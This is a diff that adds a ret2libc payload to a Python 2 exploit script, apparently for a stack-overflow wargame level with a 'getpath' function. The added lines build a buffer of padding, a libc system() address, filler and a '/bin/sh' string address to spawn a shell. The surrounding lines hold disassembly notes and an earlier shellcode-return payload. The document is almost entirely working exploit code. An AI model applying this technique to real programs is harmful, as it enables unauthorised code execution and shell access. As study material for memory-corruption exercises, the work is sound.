@@ -42,3 +42,15 @@ print pad + ret + eip + nops
 # 0x080484f3 <getpath+111>:	call   0x80483c0 <printf@plt>
 # 0x080484f8 <getpath+116>:	leave  
 # 0x080484f9 <getpath+117>:	ret 
+
+
+# ret 2lbc
+
+import struct
+
+pad = "0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
+eip = struct.pack("I", 0xbffff7c0+32)
+ret = struct.pack("I", 0xb7ecffb0)
+pads = "AAAA"
+binsh = struct.pack("I", 0xb7fb63bf)
+print pad + ret + pads + binsh
